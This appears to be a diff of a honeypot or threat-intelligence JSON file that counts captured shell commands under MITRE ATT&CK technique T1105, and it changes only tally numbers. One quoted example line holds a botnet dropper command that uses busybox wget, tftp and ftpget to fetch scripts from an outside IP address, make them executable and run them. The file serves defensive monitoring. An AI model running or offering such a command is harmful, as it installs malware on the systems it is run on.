@@ -41,7 +41,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 1082,
+      "count": 1102,
       "distinct_ips": 104,
       "examples": [
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
@@ -136,6 +136,6 @@
       ]
     }
   ],
-  "total_commands": 144132,
-  "matched_commands": 76951
+  "total_commands": 144214,
+  "matched_commands": 76971
 }
